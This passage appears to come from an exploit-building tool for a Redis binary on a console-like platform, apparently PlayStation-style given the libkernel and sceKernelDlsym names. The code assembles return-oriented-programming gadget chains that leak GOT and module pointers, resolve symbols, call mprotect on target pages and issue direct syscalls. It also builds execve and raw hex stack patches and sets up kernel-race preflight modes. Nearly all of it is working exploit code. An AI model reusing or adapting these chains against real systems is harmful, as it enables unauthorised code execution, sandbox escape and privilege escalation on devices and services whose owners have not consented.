            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            # msg+0x10 = *(SELF_INFO_PTR).  Do not dereference it here.
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RAX_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 0x10)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

        elif lowrop_self_dlsym_probe:
            if args.lowrop_self_dlsym_flavor == "kernel":
                qwords_from_getpid_to_self_ptr = (
                    LIBKERNEL_SELF_INFO_PTR - LIBKERNEL_GETPID
                ) // 8
            else:
                qwords_from_getpid_to_self_ptr = (
                    LIBKERNEL_SYS_SELF_INFO_PTR - LIBKERNEL_SYS_GETPID
                ) // 8

            sym_addrs = {}
            for symbol, off, blob in dlsym_blobs:
                putb(off, blob)
                sym_addrs[symbol] = scratch + off
            out_base = scratch + dlsym_out_off

            for i, (_flavor, symbol) in enumerate(dlsym_cases):
                out_slot = out_base + i * 8
                result_slot = msg_addr + i * 24

                # self_info = *(libkernel[_sys] + SELF_INFO_PTR)
                # handle = *(uint32_t *)(self_info + 0x10)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args.eboot_base + REDIS_EBOOT_GETPID_GOT)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                emit_pop_rdx_padded(qwords_from_getpid_to_self_ptr)
                emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RAX_RET)
                emit_pop_rdx_padded(2)
                emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RAX_RET)

                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(result_slot)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

                # sceKernelDlsym((int)handle, symbol, &out_slot)
                emitq(args.eboot_base + REDIS_EBOOT_XCHG_EDI_EAX_RET)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(sym_addrs[symbol])
                emit_pop_rdx_padded(out_slot)
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_DLSYM_PLT)

                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(result_slot + 8)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(out_slot)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(result_slot + 16)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

        elif lowrop_mprotect_probe:
            qwords_from_send_to_target = -(args.lowrop_send_export_offset - args.lowrop_syscall_offset) // 8

            # rax = *(send GOT); rax -= (send_export - target_export).
            # The live PRX mapping is not page-base aligned, so derive from
            # the send export itself rather than from the page base.
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(args.eboot_base + 0x126538)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
            emit_pop_rdx_padded(qwords_from_send_to_target & 0xFFFFFFFFFFFFFFFF)
            emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)

            # Send back the derived mprotect pointer.
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            if not args.lowrop_mprotect_derive_only:
                # mprotect(target_page, len, prot).  rax survives the pop gadgets.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(mprotect_target_page)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(args.lowrop_mprotect_len)
                emit_pop_rdx_padded(args.lowrop_mprotect_prot)
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_PUSH_RAX_RET)

                # Store mprotect return in msg+8.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(msg_addr + 8)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

        elif lowrop_indirect_send_probe:
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(args.eboot_base + 0x126538)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)

            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(args.dispatch_fd)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
            emitq(msg_addr)
            emit_pop_rdx_padded(len(msg))
            emit_aligned_call(args.eboot_base + REDIS_EBOOT_PUSH_RAX_RET)

        elif lowrop_eboot_getpid_probe:
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(args.eboot_base + REDIS_EBOOT_GETPID_GOT)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)

            # msg+0 = direct Redis getpid GOT function pointer.
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            if not args.lowrop_eboot_getpid_derive_only:
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_PUSH_RAX_RET)

                # msg+8 = getpid return value.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(msg_addr + 8)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

        elif lowrop_eboot_gettimeofday_probe:
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(args.eboot_base + REDIS_EBOOT_GETTIMEOFDAY_GOT)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)

            # msg+0 = direct Redis gettimeofday GOT function pointer.
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            if not args.lowrop_eboot_gettimeofday_derive_only:
                # gettimeofday(msg+0x10, NULL).  Keep msg+8 for the return.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(msg_addr + 0x10)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(0)
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_PUSH_RAX_RET)

                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(msg_addr + 8)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

        elif lowrop_eboot_mprotect_probe:
            if args.lowrop_eboot_mprotect_flavor == "kernel":
                qwords_from_getpid_to_mprotect = (LIBKERNEL_MPROTECT - LIBKERNEL_GETPID) // 8
                qwords_from_getpid_to_errno_ptr = (LIBKERNEL_ERRNO_PTR - LIBKERNEL_GETPID) // 8
            else:
                qwords_from_getpid_to_mprotect = (LIBKERNEL_SYS_MPROTECT - LIBKERNEL_SYS_GETPID) // 8
                qwords_from_getpid_to_errno_ptr = (LIBKERNEL_SYS_ERRNO_PTR - LIBKERNEL_SYS_GETPID) // 8

            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(args.eboot_base + REDIS_EBOOT_GETPID_GOT)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)

            # msg+0 = direct Redis getpid GOT function pointer.
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            # rax = candidate mprotect in the same libkernel/libkernel_sys image.
            emit_pop_rdx_padded(qwords_from_getpid_to_mprotect)
            emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)

            # msg+8 = derived mprotect pointer.
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 8)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            if not args.lowrop_mprotect_derive_only:
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(mprotect_target_page)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(args.lowrop_mprotect_len)
                emit_pop_rdx_padded(args.lowrop_mprotect_prot)
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_PUSH_RAX_RET)

                # msg+0x10 = mprotect return value.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(msg_addr + 0x10)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

                if getattr(args, "lowrop_mprotect_capture_errno", False):
                    # msg+0x18 = errno pointer, msg+0x20 = errno qword.
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(args.eboot_base + REDIS_EBOOT_GETPID_GOT)
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    emit_pop_rdx_padded(qwords_from_getpid_to_errno_ptr)
                    emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)
                    emit_aligned_call(args.eboot_base + REDIS_EBOOT_PUSH_RAX_RET)

                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(msg_addr + 0x18)
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(msg_addr + 0x18)
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RAX_RET)
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(msg_addr + 0x20)
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

        elif lowrop_libc_gettimeofday_probe:
            qwords_from_memcpy_to_gtod_got = (LIBC_GETTIMEOFDAY_GOT - LIBC_MEMCPY_EXPORT) // 8

            # rax = live libc memcpy; rax += libc(gettimeofday GOT - memcpy).
            # This keeps the derivation inside one mapped libc image instead
            # of guessing a libkernel/libkernel_sys base from Redis imports.
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(args.eboot_base + REDIS_EBOOT_MEMCPY_GOT)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
            emit_pop_rdx_padded(qwords_from_memcpy_to_gtod_got)
            emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)

            # msg+0 = libc gettimeofday GOT address.
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            # rax = *(libc gettimeofday GOT), normally a libkernel wrapper.
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RAX_RET)

            # msg+8 = resolved gettimeofday wrapper.
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 8)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            if not args.lowrop_libc_gettimeofday_derive_only:
                # gettimeofday(msg+0x18, NULL).  rax survives the pop gadgets.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(msg_addr + 0x18)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(0)
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_PUSH_RAX_RET)

                # msg+0x10 = wrapper return value.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(msg_addr + 0x10)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

        elif lowrop_libc_getpid_probe:
            qwords_from_memcpy_to_getpid_got = (LIBC_GETPID_GOT - LIBC_MEMCPY_EXPORT) // 8

            # rax = live libc memcpy; rax += libc(getpid GOT - memcpy).
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(args.eboot_base + REDIS_EBOOT_MEMCPY_GOT)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
            emit_pop_rdx_padded(qwords_from_memcpy_to_getpid_got)
            emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)

            # msg+0 = libc getpid GOT address.
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            # rax = *(libc getpid GOT), normally a libkernel wrapper.
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RAX_RET)

            # msg+8 = resolved getpid wrapper.
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 8)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            if not args.lowrop_libc_getpid_derive_only:
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_PUSH_RAX_RET)

                # msg+0x10 = getpid return value.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(msg_addr + 0x10)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

        elif leak_offsets is not None:
            for i, off in enumerate(leak_offsets):
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args.eboot_base + off)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(msg_addr + i * 8)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

        emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
        emitq(args.dispatch_fd)
        emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
        emitq(msg_addr)
        emit_pop_rdx_padded(len(msg))
        emit_aligned_call(args.eboot_base + REDIS_EBOOT_SEND_PLT)
        emitq(0)
        if not external_msg and args.lowrop_chain_offset + len(chain) > args.lowrop_msg_offset:
            raise RuntimeError(
                "lowrop chain overlaps message: "
                f"chain_end=0x{args.lowrop_chain_offset + len(chain):X} "
                f"msg_off=0x{args.lowrop_msg_offset:X}"
            )
        putb(args.lowrop_chain_offset, bytes(chain))
        external_msg_value = None
        if external_msg:
            external_msg_value = bytes(msg)
        else:
            putb(args.lowrop_msg_offset, msg)

        info = {
            "lowrop_scratch": scratch,
            "lowrop_vtable": vtable,
            "lowrop_chain": chain_addr,
            "lowrop_chain_len": len(chain),
            "lowrop_chain_end_off": args.lowrop_chain_offset + len(chain),
            "lowrop_msg": msg_addr,
            "lowrop_msg_len": len(msg),
            "lowrop_external_msg": external_msg,
            "lowrop_fd": args.dispatch_fd,
            "lowrop_copy_len": copy_len,
            "lowrop_pair": stack_addr + pair_off,
            "lowrop_kind": "notify" if lowrop_notify else "sandbox_probe" if lowrop_sandbox_probe else "lapse_race_rthdr" if lowrop_lapse_race_rthdr else "lapse_rthdr_preflight" if lowrop_lapse_rthdr_preflight else "lapse_race_one" if lowrop_lapse_race_one else "lapse_suspend_preflight" if lowrop_lapse_suspend_preflight else "lapse_worker_preflight" if lowrop_lapse_worker_preflight else "lapse_thread_preflight" if lowrop_lapse_thread_preflight else "lapse_preflight" if lowrop_lapse_preflight else "umtx2_spray_existing" if lowrop_umtx2_spray_existing else "umtx2_race_one" if lowrop_umtx2_race_one else "umtx2_wrapper_preflight" if lowrop_umtx2_wrapper_preflight else "umtx2_preflight" if lowrop_umtx2_preflight else "code_read_probe" if lowrop_code_read_probe else "direct_syscall_probe" if lowrop_direct_syscall_probe else "wrapper_call_probe" if lowrop_wrapper_call_probe else "self_info_leak" if lowrop_self_info_leak else "self_dlsym_probe" if lowrop_self_dlsym_probe else "dynlib_list_probe" if lowrop_dynlib_list_probe else "module_table_leak" if lowrop_module_table_leak else "module_dlsym_probe" if lowrop_module_dlsym_probe else "dlsym_probe" if lowrop_dlsym_probe else "mprotect_probe" if lowrop_mprotect_probe else "indirect_send_probe" if lowrop_indirect_send_probe else "eboot_getpid_probe" if lowrop_eboot_getpid_probe else "eboot_gettimeofday_probe" if lowrop_eboot_gettimeofday_probe else "eboot_mprotect_probe" if lowrop_eboot_mprotect_probe else "libc_gettimeofday_probe" if lowrop_libc_gettimeofday_probe else "libc_getpid_probe" if lowrop_libc_getpid_probe else "got_leak" if leak_offsets is not None else "send",
            "lowrop_indirect_send": lowrop_indirect_send_probe,
            "lowrop_eboot_getpid": {
                "got": args.eboot_base + REDIS_EBOOT_GETPID_GOT,
                "derive_only": args.lowrop_eboot_getpid_derive_only,
            } if lowrop_eboot_getpid_probe else None,
            "lowrop_eboot_gettimeofday": {
                "got": args.eboot_base + REDIS_EBOOT_GETTIMEOFDAY_GOT,
                "derive_only": args.lowrop_eboot_gettimeofday_derive_only,
            } if lowrop_eboot_gettimeofday_probe else None,
            "lowrop_eboot_mprotect": {
                "getpid_got": args.eboot_base + REDIS_EBOOT_GETPID_GOT,
                "target": mprotect_target_kind,
                "target_page": mprotect_target_page,
                "length": args.lowrop_mprotect_len,
                "prot": args.lowrop_mprotect_prot,
                "flavor": args.lowrop_eboot_mprotect_flavor,
                "errno_ptr_offset": LIBKERNEL_ERRNO_PTR if args.lowrop_eboot_mprotect_flavor == "kernel" else LIBKERNEL_SYS_ERRNO_PTR,
                "capture_errno": getattr(args, "lowrop_mprotect_capture_errno", False),
                "derive_only": args.lowrop_mprotect_derive_only,
            } if lowrop_eboot_mprotect_probe else None,
            "lowrop_libc_getpid": {
                "memcpy_got": args.eboot_base + REDIS_EBOOT_MEMCPY_GOT,
                "libc_memcpy_export": LIBC_MEMCPY_EXPORT,
                "libc_getpid_got": LIBC_GETPID_GOT,
                "qword_delta": (LIBC_GETPID_GOT - LIBC_MEMCPY_EXPORT) // 8,
                "derive_only": args.lowrop_libc_getpid_derive_only,
            } if lowrop_libc_getpid_probe else None,
            "lowrop_libc_gettimeofday": {
                "memcpy_got": args.eboot_base + REDIS_EBOOT_MEMCPY_GOT,
                "libc_memcpy_export": LIBC_MEMCPY_EXPORT,
                "libc_gettimeofday_got": LIBC_GETTIMEOFDAY_GOT,
                "qword_delta": (LIBC_GETTIMEOFDAY_GOT - LIBC_MEMCPY_EXPORT) // 8,
                "derive_only": args.lowrop_libc_gettimeofday_derive_only,
            } if lowrop_libc_gettimeofday_probe else None,
            "lowrop_leak_offsets": leak_offsets or [],
            "lowrop_dlsym_cases": dlsym_cases or [],
            "lowrop_module_dlsym": {
                "getpid_got": args.eboot_base + REDIS_EBOOT_GETPID_GOT,
                "flavor": args.lowrop_module_dlsym_flavor,
                "get_module_handle_offset": LIBKERNEL_GET_MODULE_HANDLE if args.lowrop_module_dlsym_flavor == "kernel" else LIBKERNEL_SYS_GET_MODULE_HANDLE,
            } if lowrop_module_dlsym_probe else None,
            "lowrop_module_table": {
                "getpid_got": args.eboot_base + REDIS_EBOOT_GETPID_GOT,
                "flavor": args.lowrop_module_table_flavor,
                "entries": module_table_entries,
                "table_offset": LIBKERNEL_MODULE_TABLE if args.lowrop_module_table_flavor == "kernel" else LIBKERNEL_SYS_MODULE_TABLE,
            } if lowrop_module_table_leak else None,
            "lowrop_dynlib_list": {
                "getpid_got": args.eboot_base + REDIS_EBOOT_GETPID_GOT,
                "flavor": args.lowrop_dynlib_flavor,
                "get_list_offset": LIBKERNEL_DYNLIB_GET_LIST if args.lowrop_dynlib_flavor == "kernel" else LIBKERNEL_SYS_DYNLIB_GET_LIST,
                "max": dynlib_list_max,
                "order": args.lowrop_dynlib_list_order,
                "capture_errno": args.lowrop_dynlib_capture_errno,
            } if lowrop_dynlib_list_probe else None,
            "lowrop_wrapper_call": {
                "source": args.lowrop_wrapper_source,
                "source_got": (
                    args.eboot_base
                    + {
                        "getpid": REDIS_EBOOT_GETPID_GOT,
                        "gettimeofday": REDIS_EBOOT_GETTIMEOFDAY_GOT,
                        "send": REDIS_EBOOT_SEND_GOT,
                    }[args.lowrop_wrapper_source]
                ),
                "flavor": args.lowrop_wrapper_flavor,
                "wrapper_offset": args.lowrop_wrapper_offset,
                "msg_len": len(msg),
                "args": [
                    args.lowrop_wrapper_arg1,
                    args.lowrop_wrapper_arg2,
                    args.lowrop_wrapper_arg3,
                    args.lowrop_wrapper_arg4,
                    args.lowrop_wrapper_arg5,
                    args.lowrop_wrapper_arg6,
                ],
                "arg_msg_offsets": [
                    args.lowrop_wrapper_arg1_msg_offset,
                    args.lowrop_wrapper_arg2_msg_offset,
                    args.lowrop_wrapper_arg3_msg_offset,
                    args.lowrop_wrapper_arg4_msg_offset,
                    args.lowrop_wrapper_arg5_msg_offset,
                    args.lowrop_wrapper_arg6_msg_offset,
                ],
                "arg_scratch_offsets": [
                    args.lowrop_wrapper_arg1_scratch_offset,
                    args.lowrop_wrapper_arg2_scratch_offset,
                    args.lowrop_wrapper_arg3_scratch_offset,
                    args.lowrop_wrapper_arg4_scratch_offset,
                    args.lowrop_wrapper_arg5_scratch_offset,
                    args.lowrop_wrapper_arg6_scratch_offset,
                ],
                "prezero_r8_r9": args.lowrop_wrapper_prezero_r8_r9,
                "capture_errno": args.lowrop_wrapper_capture_errno,
                "use_libc_call8": args.lowrop_wrapper_use_libc_call8,
                "call8_send_self": args.lowrop_wrapper_call8_send_self,
                "use_setcontext": args.lowrop_wrapper_use_setcontext,
                "setcontext_offset": args.lowrop_wrapper_setcontext_offset,
                "no_save_context": args.lowrop_wrapper_no_save_context,
                "setcontext_ping_only": args.lowrop_wrapper_setcontext_ping_only,
                "setcontext_send_only": args.lowrop_wrapper_setcontext_send_only,
                "setcontext_call_rax": args.lowrop_wrapper_setcontext_call_rax,
                "setcontext_pivot_only": args.lowrop_wrapper_setcontext_pivot_only,
                "preflight_send": args.lowrop_wrapper_preflight_send,
            } if lowrop_wrapper_call_probe else None,
            "lowrop_direct_syscall": {
                "source": args.lowrop_direct_syscall_source,
                "source_got": (
                    args.eboot_base + REDIS_EBOOT_GETTIMEOFDAY_GOT
                    if args.lowrop_direct_syscall_source == "gettimeofday"
                    else args.eboot_base + REDIS_EBOOT_GETPID_GOT
                ),
                "flavor": args.lowrop_direct_syscall_flavor,
                "wrapper_offset": args.lowrop_direct_syscall_wrapper_offset,
                "landing_adjust": args.lowrop_direct_syscall_landing_adjust,
                "syscall_num": args.lowrop_direct_syscall_num,
                "msg_len": len(msg),
                "sixargs": args.lowrop_direct_syscall_sixargs,
                "capture_errno": args.lowrop_direct_syscall_capture_errno,
                "args": [
                    args.lowrop_direct_syscall_arg1,
                    args.lowrop_direct_syscall_arg2,
                    args.lowrop_direct_syscall_arg3,
                    args.lowrop_direct_syscall_arg4,
                    args.lowrop_direct_syscall_arg5,
                    args.lowrop_direct_syscall_arg6,
                ],
                "arg_msg_offsets": [
                    args.lowrop_direct_syscall_arg1_msg_offset,
                    args.lowrop_direct_syscall_arg2_msg_offset,
                    args.lowrop_direct_syscall_arg3_msg_offset,
                    args.lowrop_direct_syscall_arg4_msg_offset,
                    args.lowrop_direct_syscall_arg5_msg_offset,
                    args.lowrop_direct_syscall_arg6_msg_offset,
                ],
                "arg_scratch_offsets": [
                    args.lowrop_direct_syscall_arg1_scratch_offset,
                    args.lowrop_direct_syscall_arg2_scratch_offset,
                    args.lowrop_direct_syscall_arg3_scratch_offset,
                    args.lowrop_direct_syscall_arg4_scratch_offset,
                    args.lowrop_direct_syscall_arg5_scratch_offset,
                    args.lowrop_direct_syscall_arg6_scratch_offset,
                ],
                "arg_stack_offsets": [
                    args.lowrop_direct_syscall_arg1_stack_offset,
                    args.lowrop_direct_syscall_arg2_stack_offset,
                    args.lowrop_direct_syscall_arg3_stack_offset,
                    args.lowrop_direct_syscall_arg4_stack_offset,
                    args.lowrop_direct_syscall_arg5_stack_offset,
                    args.lowrop_direct_syscall_arg6_stack_offset,
                ],
                "arg_stack_page_offsets": [
                    args.lowrop_direct_syscall_arg1_stack_page_offset,
                    args.lowrop_direct_syscall_arg2_stack_page_offset,
                    args.lowrop_direct_syscall_arg3_stack_page_offset,
                    args.lowrop_direct_syscall_arg4_stack_page_offset,
                    args.lowrop_direct_syscall_arg5_stack_page_offset,
                    args.lowrop_direct_syscall_arg6_stack_page_offset,
                ],
            } if lowrop_direct_syscall_probe else None,
            "lowrop_code_read": {
                "source": args.lowrop_code_read_source,
                "flavor": args.lowrop_code_read_flavor,
                "wrapper_offset": args.lowrop_code_read_wrapper_offset,
                "adjust": args.lowrop_code_read_adjust,
                "read_len": code_read_len,
            } if lowrop_code_read_probe else None,
            "lowrop_self_dlsym": {
                "getpid_got": args.eboot_base + REDIS_EBOOT_GETPID_GOT,
                "flavor": args.lowrop_self_dlsym_flavor,
                "self_info_ptr_offset": LIBKERNEL_SELF_INFO_PTR if args.lowrop_self_dlsym_flavor == "kernel" else LIBKERNEL_SYS_SELF_INFO_PTR,
            } if (lowrop_self_dlsym_probe or lowrop_self_info_leak) else None,
            "lowrop_mprotect": {
                "target": mprotect_target_kind,
                "target_page": mprotect_target_page,
                "length": args.lowrop_mprotect_len,
                "prot": args.lowrop_mprotect_prot,
                "send_to_mprotect_delta": LIBKERNEL_SYS_SEND_TO_MPROTECT_DELTA,
                "send_export_offset": args.lowrop_send_export_offset,
                "syscall_offset": args.lowrop_syscall_offset,
                "derive_only": args.lowrop_mprotect_derive_only,
            } if lowrop_mprotect_probe else None,
            "lowrop_notify": {
                "notify": scratch + notify_off,
                "path": scratch + path_off,
                "fd_slot": scratch + fd_slot_off,
                "icon": scratch + icon_off,
                "text": scratch + text_off,
                "size": notify_size,
            } if lowrop_notify else None,
            "lowrop_sandbox_probe": {
                "count": len(sandbox_paths),
                "flags": args.lowrop_sandbox_open_flags,
                "record_size": SANDBOX_PROBE_RECORD_SIZE,
            } if lowrop_sandbox_probe else None,
            "pair0": stack_addr,
            "pair1": copy_len,
        }
        if external_msg_value is not None:
            info["lowrop_external_msg_value"] = external_msg_value
        return bytes(stack), info
    if getattr(args, "stack_execve_path", None):
        path_off = args.stack_execve_path_offset
        argv_off = args.stack_execve_argv_offset
        envp_off = args.stack_execve_envp_offset
        if path_off < 0x10 or argv_off < 0x10 or envp_off < 0x10:
            raise RuntimeError("execve stack offsets must leave room for the c24f0 pair")

        stack = bytearray(b"\x00" * stack_size)
        strings = [args.stack_execve_path] + list(args.stack_execve_arg or [])
        addrs = []
        cur = path_off
        for text_value in strings:
            blob = text_value.encode("ascii", errors="replace") + b"\x00"
            if cur + len(blob) > stack_size:
                raise RuntimeError("--stack-execve-path/arg strings do not fit in --stack-size")
            stack[cur:cur + len(blob)] = blob
            addrs.append(stack_addr + cur)
            cur = (cur + len(blob) + 7) & ~7

        argv_len = (len(addrs) + 1) * 8
        if argv_off + argv_len > stack_size:
            raise RuntimeError("--stack-execve-argv-offset leaves argv outside --stack-size")
        if envp_off + 8 > stack_size:
            raise RuntimeError("--stack-execve-envp-offset leaves envp outside --stack-size")

        for i, addr in enumerate(addrs):
            struct.pack_into("<Q", stack, argv_off + i * 8, addr)
        struct.pack_into("<Q", stack, argv_off + len(addrs) * 8, 0)
        struct.pack_into("<Q", stack, envp_off, 0)

        argv_addr = stack_addr + argv_off
        envp_addr = stack_addr + envp_off
        struct.pack_into("<Q", stack, 0x00, argv_addr)
        struct.pack_into("<Q", stack, 0x08, envp_addr)
        return bytes(stack), {
            "execve_path": addrs[0],
            "execve_argv": argv_addr,
            "execve_envp": envp_addr,
            "execve_argc": len(addrs),
            "pair0": argv_addr,
            "pair1": envp_addr,
        }
    if getattr(args, "stack_patch_hex", None):
        patch = bytes.fromhex(args.stack_patch_hex.replace(" ", "").replace(":", ""))
        patch_off = args.stack_patch_offset
        if patch_off < 0x10 or patch_off >= stack_size:
            raise RuntimeError("--stack-patch-offset must point inside the stack after the c24f0 pair")
        if patch_off + len(patch) > stack_size:
            raise RuntimeError("--stack-patch-hex does not fit at --stack-patch-offset")
        stack = bytearray(b"B" * stack_size)
        struct.pack_into("<Q", stack, 0x00, stack_addr + patch_off)
        struct.pack_into("<Q", stack, 0x08, len(patch))
        stack[patch_off:patch_off + len(patch)] = patch
        return bytes(stack), {
            "patch_addr": stack_addr + patch_off,
            "patch_len": len(patch),
            "patch_offset": patch_off,
            "patch_hex": patch.hex(),
            "pair0": stack_addr + patch_off,
            "pair1": len(patch),
        }
    if getattr(args, "stack_fake_client_copy_send", False):
        fake_off = getattr(args, "stack_fake_client_offset", 0x120)
        copy_len = stack_ret
        if fake_off < 0x20:
            raise RuntimeError("--stack-fake-client-offset must leave space for an SDS5 header")
        if copy_len < 1 or copy_len > 31:
            raise RuntimeError("--stack-ret must be 1..31 for the SDS5 copy-send helper")
        if fake_off + 0xA0 > stack_size:
            raise RuntimeError("--stack-fake-client-offset leaves fake client fields outside --stack-size")
        if getattr(args, "dispatch_fd", None) is None:
            raise RuntimeError("--stack-fake-client-copy-send needs --dispatch-arg-sidecar-fd or --dispatch-arg-client-fd")

        stack = bytearray(b"B" * stack_size)
        # c24f0 reads the first pair as (source, length) for the memcpy call.
        struct.pack_into("<Q", stack, 0x00, stack_arg)
